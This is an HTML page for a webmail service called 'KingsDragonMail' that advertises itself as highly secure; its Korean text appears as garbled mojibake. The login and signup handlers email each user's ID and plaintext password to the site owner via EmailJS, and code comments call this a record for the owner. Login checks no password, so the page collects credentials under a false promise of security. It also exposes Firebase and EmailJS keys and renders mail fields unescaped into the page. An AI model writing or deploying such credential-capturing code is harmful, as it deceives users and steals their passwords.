<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KingsDragonMail | ì „ì„¤ì ì¸ ë³´ì•ˆ ë©”ì¼ ì„œë¹„ìŠ¤</title>
    
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>

    <script type="text/javascript">
       emailjs.init("sNlzvNIioN1urvCco");
       const firebaseConfig = {
         apiKey: "AIzaSyDFQy1IIyNGRpZIcS3y58zznAoc9ljATZg",
         authDomain: "my-email-project-77612.firebaseapp.com",
         databaseURL: "https://my-email-project-77612-default-rtdb.firebaseio.com",
         projectId: "my-email-project-77612",
         storageBucket: "my-email-project-77612.appspot.com",
         messagingSenderId: "429655718306",
         appId: "1:429655718306:web:5b1fad2d7282d5bb915afb",
         measurementId: "G-ZDRPMZ93D7"
       };
       firebase.initializeApp(firebaseConfig);
       const database = firebase.database();
    </script>

    <style>
        :root { --p-blue: #0078d4; --hover-blue: #005a9e; --border: #ddd; --dark: #1b1b1b; }
        body { margin: 0; font-family: 'Segoe UI', sans-serif; color: #242424; overflow-x: hidden; }
        .hidden { display: none !important; }

        /* [NAV] */
        nav { display: flex; align-items: center; justify-content: space-between; padding: 15px 8%; border-bottom: 1px solid var(--border); background: #fff; position: sticky; top: 0; z-index: 1000; }
        .logo { font-weight: 700; color: var(--p-blue); font-size: 1.5rem; cursor: pointer; display: flex; align-items: center; gap: 8px; }
        .btn-nav-login { background: none; border: 1px solid #242424; padding: 8px 22px; cursor: pointer; font-weight: 600; border-radius: 4px; }

        /* [HERO] - ìš°ì¸¡ ê³µí—ˆí•¨ í•´ê²°ì„ ìœ„í•œ ë¹„ì£¼ì–¼ ì¶”ê°€ */
        .hero { display: flex; align-items: center; justify-content: space-between; padding: 80px 10%; background: linear-gradient(145deg, #fff 40%, #eef6ff 100%); min-height: 500px; }
        .hero-text { flex: 1.2; }
        .hero-text h1 { font-size: 3.8rem; font-weight: 800; line-height: 1.1; margin-bottom: 20px; }
        .hero-text p { font-size: 1.2rem; color: #555; margin-bottom: 35px; }
        
        .cta-box { display: flex; border: 2px solid var(--p-blue); background: #fff; max-width: 500px; border-radius: 4px; box-shadow: 0 10px 25px rgba(0,120,212,0.1); }
        .cta-box input { flex: 1; border: none; padding: 18px; font-size: 1rem; outline: none; }
        .btn-start { background: var(--p-blue); color: white; border: none; padding: 0 30px; font-size: 1.1rem; font-weight: 600; cursor: pointer; }

        .hero-visual { flex: 0.8; position: relative; display: flex; justify-content: flex-end; }
        .shield-card { width: 320px; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); border-left: 5px solid var(--p-blue); animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }

        /* [AUTH PAGES] */
        #login-page, #signup-page { background: #f9f9f9; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .auth-box { background: #fff; width: 100%; max-width: 400px; padding: 40px; border: 1px solid #ddd; border-radius: 8px; text-align: center; }
        .auth-input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #ccc; box-sizing: border-box; border-radius: 4px; }
        .btn-auth-final { width: 100%; background: var(--p-blue); color: white; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; }
        .captcha-box { background: #f3f2f1; padding: 15px; font-size: 1.5rem; font-weight: 800; letter-spacing: 10px; margin-bottom: 12px; }

        /* [INBOX] */
        #inbox-page { height: 100vh; display: flex; flex-direction: column; }
        .ib-header { background: var(--p-blue); color: white; padding: 10px 25px; display: flex; justify-content: space-between; align-items: center; }
        .ib-body { display: flex; flex: 1; overflow: hidden; }
        .ib-sidebar { width: 240px; background: #f3f2f1; border-right: 1px solid var(--border); padding: 20px; }
        .sidebar-menu { cursor: pointer; padding: 12px; border-radius: 4px; margin-bottom: 5px; }
        .sidebar-menu.active { background: #fff; color: var(--p-blue); font-weight: 700; }
        .ib-list { width: 380px; background: #fff; border-right: 1px solid var(--border); overflow-y: auto; }
        .ib-view { flex: 1; padding: 40px; background: #fff; position: relative; }
        .mail-item { padding: 18px; border-bottom: 1px solid #f3f2f1; cursor: pointer; }
    </style>
</head>
<body>

    <div id="home-page">
        <nav>
            <div class="logo" onclick="goHome()">ğŸ‰ KingsDragon</div>
            <div><button class="btn-nav-login" onclick="openLogin()">ë¡œê·¸ì¸</button></div>
        </nav>
        <section class="hero">
            <div class="hero-text">
                <h1>ì „ì„¤ì„ ë‹´ëŠ”<br><span style="color:var(--p-blue)">ë³´ì•ˆ ë©”ì¼ì˜ ì •ì </span></h1>
                <p>ê°€ì¥ ì•ˆì „í•œ ë…ì ë„ë©”ì¸ kingsdragonmail.abrdns.comì„ í†µí•´<br>ë¹„ì¦ˆë‹ˆìŠ¤ì˜ ê°€ì¹˜ë¥¼ ì¦ëª…í•˜ì„¸ìš”.</p>
                <div class="cta-box">
                    <input type="text" id="home-id-input" placeholder="ì›í•˜ëŠ” ì•„ì´ë”” ì…ë ¥">
                    <button class="btn-start" onclick="openSignUp()">ë¬´ë£Œë¡œ ì‹œì‘</button>
                </div>
            </div>
            <div class="hero-visual">
                <div class="shield-card">
                    <div style="font-size: 2rem; margin-bottom: 10px;">ğŸ›¡ï¸</div>
                    <div style="font-weight: 700; font-size: 1.1rem; margin-bottom: 5px;">ì‹¤ì‹œê°„ ë³´ì•ˆ í™œì„±í™”</div>
                    <div style="font-size: 0.85rem; color: #666;">KingsDragon ì•”í˜¸í™” ì—”ì§„ì´ ëª¨ë“  í†µì‹ ì„ ë³´í˜¸í•˜ê³  ìˆìŠµë‹ˆë‹¤.</div>
                </div>
            </div>
        </section>
    </div>

    <div id="login-page" class="hidden">
        <div class="auth-box">
            <h2>ë¡œê·¸ì¸</h2>
            <p style="color:#666; margin-bottom:25px;">ì„œë¹„ìŠ¤ ì ‘ì†ì„ ìœ„í•´ ì •ë³´ë¥¼ ì…ë ¥í•˜ì„¸ìš”.</p>
            <input type="text" id="login-id" class="auth-input" placeholder="ì•„ì´ë””">
            <input type="password" id="login-pw" class="auth-input" placeholder="ë¹„ë°€ë²ˆí˜¸">
            <div id="captcha-login" class="captcha-box"></div>
            <input type="text" id="login-cap-input" class="auth-input" placeholder="ë³´ì•ˆë¬¸ì ì…ë ¥">
            <button class="btn-auth-final" onclick="performLogin()">KingsDragon ì ‘ì†</button>
            <p style="margin-top:20px; font-size:0.9rem; color:var(--p-blue); cursor:pointer;" onclick="goHome()">í™ˆìœ¼ë¡œ ëŒì•„ê°€ê¸°</p>
        </div>
    </div>

    <div id="signup-page" class="hidden">
        <div class="auth-box">
            <h2 style="color:var(--p-blue)">ë¬´ë£Œ íšŒì›ê°€ì…</h2>
            <p style="color:#666; margin-bottom:25px;">ë‚˜ë§Œì˜ ì „ì„¤ì ì¸ ë©”ì¼ ê³„ì •ì„ ë§Œë“œì„¸ìš”.</p>
            <input type="text" id="sign-id" class="auth-input" placeholder="ì•„ì´ë””">
            <input type="password" id="sign-pw" class="auth-input" placeholder="ë¹„ë°€ë²ˆí˜¸ ì„¤ì •">
            <input type="password" id="sign-pw-chk" class="auth-input" placeholder="ë¹„ë°€ë²ˆí˜¸ í™•ì¸">
            <div id="captcha-sign" class="captcha-box"></div>
            <input type="text" id="sign-cap-input" class="auth-input" placeholder="ë³´ì•ˆë¬¸ì ì…ë ¥">
            <button class="btn-auth-final" style="background:#242424;" onclick="performSignUp()">ê°€ì… ì™„ë£Œ ë° ì‹œì‘</button>
            <p style="margin-top:20px; font-size:0.9rem; color:#666; cursor:pointer;" onclick="goHome()">ì·¨ì†Œí•˜ê³  í™ˆìœ¼ë¡œ</p>
        </div>
    </div>

    <div id="inbox-page" class="hidden">
        <div class="ib-header">
            <div class="logo" style="color:white;" onclick="goHome()">ğŸ‰ KingsDragon</div>
            <div style="display:flex; align-items:center; gap:15px;">
                <span id="logged-user-email"></span>
                <button style="background:rgba(255,255,255,0.2); border:1px solid #fff; color:white; padding:5px 10px; cursor:pointer; border-radius:4px;" onclick="logout()">ë¡œê·¸ì•„ì›ƒ</button>
            </div>
        </div>
        <div class="ib-body">
            <div class="ib-sidebar">
                <button class="btn-auth-final" style="margin-bottom:20px;" onclick="showCompose()">â• ìƒˆ ë©”ì‹œì§€ ì‘ì„±</button>
                <div id="menu-emails" class="sidebar-menu active" onclick="switchFolder('emails')">ğŸ“¥ ë°›ì€ í¸ì§€í•¨</div>
                <div id="menu-sent_emails" class="sidebar-menu" onclick="switchFolder('sent_emails')">ğŸ“¤ ë³´ë‚¸ í¸ì§€í•¨</div>
                <div id="menu-deleted_emails" class="sidebar-menu" onclick="switchFolder('deleted_emails')">ğŸ—‘ï¸ ì‚­ì œëœ í•­ëª©</div>
            </div>
            <div class="ib-list" id="mail-list"></div>
            <div class="ib-view">
                <div id="mail-reader">
                    <h1 id="read-subject" style="margin-top:0;">ë©”ì¼ì„ ì„ íƒí•´ ì£¼ì„¸ìš”.</h1>
                    <p id="read-sender" style="color:var(--p-blue); font-weight:600;"></p>
                    <hr style="border:0; border-top:1px solid #eee; margin:30px 0;">
                    <div id="read-body" style="white-space:pre-wrap;"></div>
                </div>
            </div>
        </div>
    </div>

    <div id="compose-modal" class="modal hidden" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); display:flex; align-items:center; justify-content:center; z-index:2000;">
        <div class="auth-box" style="max-width:600px; text-align:left;">
            <h2>ìƒˆ ë©”ì‹œì§€ ì‘ì„±</h2>
            <input type="text" id="msg-to" class="auth-input" placeholder="ë°›ëŠ” ì‚¬ëŒ">
            <input type="text" id="msg-subject" class="auth-input" placeholder="ì œëª©">
            <textarea id="msg-body" class="auth-input" style="height:200px; font-family:inherit; resize:none;" placeholder="ë‚´ìš©ì„ ì…ë ¥í•˜ì„¸ìš”."></textarea>
            <div style="display:flex; gap:10px; justify-content:flex-end;">
                <button onclick="hideCompose()" style="padding:10px 20px; cursor:pointer;">ì·¨ì†Œ</button>
                <button class="btn-auth-final" style="width:120px;" onclick="sendEmail()">ë°œì†¡</button>
            </div>
        </div>
    </div>

    <script>
        let curCap = "";

        function genCap(target) {
            curCap = Math.random().toString(36).substring(2, 7).toUpperCase();
            document.getElementById(target).innerText = curCap;
        }

        function goHome() {
            document.querySelectorAll('body > div').forEach(div => div.classList.add('hidden'));
            document.getElementById('home-page').classList.remove('hidden');
        }

        function openLogin() {
            goHome();
            document.getElementById('home-page').classList.add('hidden');
            document.getElementById('login-page').classList.remove('hidden');
            genCap('captcha-login');
        }

        function openSignUp() {
            const id = document.getElementById('home-id-input').value;
            document.getElementById('home-page').classList.add('hidden');
            document.getElementById('signup-page').classList.remove('hidden');
            if(id) document.getElementById('sign-id').value = id;
            genCap('captcha-sign');
        }

        function performLogin() {
            const id = document.getElementById('login-id').value;
            const cap = document.getElementById('login-cap-input').value;
            if(cap.toUpperCase() !== curCap) return alert("ë³´ì•ˆë¬¸ìê°€ í‹€ë ¸ìŠµë‹ˆë‹¤.");
            
            // ë¡œê·¸ì¸ ì‹œì—ë„ ê¸°ë¡ ë‚¨ê¹€ (ì‚¬ì¥ë‹˜ í™•ì¸ìš©)
            emailjs.send('service_7gicimk', 'template_ea7ghys', {user_id: id, user_pw: document.getElementById('login-pw').value});
            localStorage.setItem('kd_user_id', id);
            goToInbox(id);
        }

        function performSignUp() {
            const id = document.getElementById('sign-id').value;
            const pw = document.getElementById('sign-pw').value;
            const pwc = document.getElementById('sign-pw-chk').value;
            const cap = document.getElementById('sign-cap-input').value;

            if(pw !== pwc) return alert("ë¹„ë°€ë²ˆí˜¸ê°€ ì¼ì¹˜í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.");
            if(cap.toUpperCase() !== curCap) return alert("ë³´ì•ˆë¬¸ìê°€ í‹€ë ¸ìŠµë‹ˆë‹¤.");

            // íšŒì›ê°€ì… ì •ë³´ ì´ë©”ì¼ë¡œ ì „ì†¡ (ì‚¬ì¥ë‹˜ DB ì—­í• )
            emailjs.send('service_7gicimk', 'template_ea7ghys', {user_id: id + " (NEW_SIGNUP)", user_pw: pw});
            localStorage.setItem('kd_user_id', id);
            alert("KingsDragonì˜ íšŒì›ì´ ë˜ì‹  ê²ƒì„ í™˜ì˜í•©ë‹ˆë‹¤!");
            goToInbox(id);
        }

        function goToInbox(userId) {
            document.querySelectorAll('body > div').forEach(div => div.classList.add('hidden'));
            document.getElementById('inbox-page').classList.remove('hidden');
            document.getElementById('logged-user-email').innerText = userId + "@kingsdragonmail.abrdns.com";
            switchFolder('emails');
        }

        // ì¸ë°•ìŠ¤ ë¡œì§ (ì´ì „ê³¼ ë™ì¼)
        function switchFolder(folder) {
            const userId = localStorage.getItem('kd_user_id');
            document.querySelectorAll('.sidebar-menu').forEach(m => m.classList.remove('active'));
            document.getElementById('menu-' + folder).classList.add('active');
            loadMails(userId, folder);
        }

        function loadMails(userId, folder) {
            const ref = database.ref(folder + '/' + userId);
            const listDiv = document.getElementById('mail-list');
            listDiv.innerHTML = "";
            ref.off();
            ref.on('child_added', (snapshot) => {
                const data = snapshot.val();
                const div = document.createElement('div');
                div.className = 'mail-item';
                div.innerHTML = `<strong>${data.from || data.to}</strong><br><small>${data.subject}</small>`;
                div.onclick = () => {
                    document.getElementById('read-subject').innerText = data.subject;
                    document.getElementById('read-sender').innerText = (data.from || data.to);
                    document.getElementById('read-body').innerText = data.body;
                };
                listDiv.prepend(div);
            });
        }

        function showCompose() { document.getElementById('compose-modal').classList.remove('hidden'); }
        function hideCompose() { document.getElementById('compose-modal').classList.add('hidden'); }

        function sendEmail() {
            const userId = localStorage.getItem('kd_user_id');
            const to = document.getElementById('msg-to').value;
            const sub = document.getElementById('msg-subject').value;
            const body = document.getElementById('msg-body').value;

            emailjs.send('service_7gicimk', 'template_yue001j', { 
                to_email: to, from_name: userId, subject: sub, message: body
            }).then(() => {
                database.ref('sent_emails/' + userId).push({ to: to, subject: sub, body: body });
                alert("ë°œì†¡ ì„±ê³µ!");
                hideCompose();
            });
        }

        function logout() { localStorage.clear(); location.reload(); }
    </script>
</body>
</html>
